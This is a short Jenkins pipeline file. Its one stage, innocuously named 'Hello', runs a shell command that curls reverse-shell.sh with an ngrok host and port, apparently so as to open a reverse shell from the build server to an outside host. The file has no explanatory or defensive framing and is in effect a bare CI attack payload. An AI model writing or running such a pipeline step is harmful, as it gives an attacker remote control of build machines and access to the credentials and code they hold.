pipeline {
	agent any
	stages {
    	stage('Hello') {
        	steps {
            	sh '''
                	curl https://reverse-shell.sh/0.tcp.ngrok.io:13384 sh
            	'''
        	}
    	}
	}
}
